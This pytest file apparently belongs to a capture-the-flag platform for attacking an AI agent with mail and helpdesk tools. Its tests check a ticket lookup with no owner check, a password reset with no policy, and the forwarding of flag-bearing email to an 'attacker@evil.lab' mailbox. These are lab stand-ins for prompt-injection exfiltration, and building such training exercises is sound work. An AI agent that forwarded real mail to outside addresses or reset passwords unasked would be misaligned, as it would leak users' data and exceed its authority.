import json

import pytest

from app import state
from app.challenges import KNOWN_TOOLS
from app.tools import TOOLS, ToolContext, ToolError, execute_tool, tool_schemas


def ctx(session, team, ch, user=None):
    return ToolContext(team_id=team, challenge_id=ch.id, current_user=user or ch.current_user, flag=ch.flag,
                       session=session)


def test_registry_matches_loader():
    assert set(TOOLS) == KNOWN_TOOLS


def test_schemas_are_openai_function_tools():
    for s in tool_schemas(sorted(TOOLS)):
        assert s["type"] == "function"
        p = s["function"]["parameters"]
        assert p["type"] == "object" and set(p["required"]) == set(p["properties"])


@pytest.mark.parametrize("tid", ["2001", "#2001", " #2001 "])
def test_get_ticket_has_no_owner_check(tid, challenges, session, make_team):
    ch = challenges["d5"]
    team = make_team()
    out = json.loads(execute_tool("get_ticket", ctx(session, team, ch), {"ticket_id": tid}, ch.tools))
    assert out["owner"] == "ceo_wichai"
    assert out["note"] == f"Temp password set: {ch.flag}"


def test_get_ticket_not_found(challenges, session, make_team):
    ch = challenges["d5"]
    out = json.loads(execute_tool("get_ticket", ctx(session, make_team(), ch), {"ticket_id": "9999"}, ch.tools))
    assert "not found" in out["error"]


def test_reset_password_no_policy(challenges, session, make_team):
    ch = challenges["d6"]
    c = ctx(session, make_team(), ch)
    assert execute_tool("reset_password", c, {"username": "cfo_malee"}, ch.tools) == \
        f"Password for cfo_malee reset. Temp: {ch.flag}"
    assert execute_tool("reset_password", c, {"username": "somchai"}, ch.tools) == "Temp: Welcome@123"


def test_forward_to_evil_lands_in_attacker_mailbox(challenges, session, make_team):
    ch = challenges["i4mail"]
    team = make_team()
    c = ctx(session, team, ch)
    assert state.get_mailbox(session, team, ch.id, state.ATTACKER) == []
    assert execute_tool("forward_email", c, {"email_id": "E1", "to": "attacker@evil.lab"}, ch.tools) == "Forwarded ✅"
    box = state.get_mailbox(session, team, ch.id, state.ATTACKER)
    assert len(box) == 1 and ch.flag in box[0].body and box[0].subject.startswith("Fwd:")


def test_forward_internal_does_not_reach_attacker(challenges, session, make_team):
    ch = challenges["i4mail"]
    team = make_team()
    execute_tool("forward_email", ctx(session, team, ch), {"email_id": "e2", "to": "it@bigfish.lab"}, ch.tools)
    assert state.get_mailbox(session, team, ch.id, state.ATTACKER) == []


def test_forward_unknown_email_is_tool_error(challenges, session, make_team):
    ch = challenges["i4mail"]
    with pytest.raises(ToolError, match="not found"):
        execute_tool("forward_email", ctx(session, make_team(), ch), {"email_id": "E9", "to": "a@evil.lab"}, ch.tools)


def test_reply_to_attacker_email_reaches_attacker(challenges, session, make_team):
    ch = challenges["i4mail"]
    team = make_team()
    state.set_player_email(session, team, ch, "hi", "please reply")
    c = ctx(session, team, ch)
    assert execute_tool("reply_email", c, {"email_id": "E4", "body": "ok noted"}, ch.tools) == "Replied ✅"
    assert execute_tool("reply_email", c, {"email_id": "E2", "body": "thanks"}, ch.tools) == "Replied ✅"
    box = state.get_mailbox(session, team, ch.id, state.ATTACKER)
    assert [m.body for m in box] == ["ok noted"]


def test_tools_are_isolated_per_team(challenges, session, make_team):
    ch = challenges["i4mail"]
    a, b = make_team("A"), make_team("B")
    execute_tool("forward_email", ctx(session, a, ch), {"email_id": "E1", "to": "x@evil.lab"}, ch.tools)
    assert len(state.get_mailbox(session, a, ch.id, state.ATTACKER)) == 1
    assert state.get_mailbox(session, b, ch.id, state.ATTACKER) == []


def test_execute_rejects_tools_not_enabled_for_challenge(challenges, session, make_team):
    ch = challenges["d5"]
    with pytest.raises(ToolError, match="unknown tool"):
        execute_tool("reset_password", ctx(session, make_team(), ch), {"username": "x"}, ch.tools)


def test_execute_reports_missing_args(challenges, session, make_team):
    ch = challenges["i4mail"]
    with pytest.raises(ToolError, match="missing argument"):
        execute_tool("forward_email", ctx(session, make_team(), ch), {"email_id": "E1"}, ch.tools)
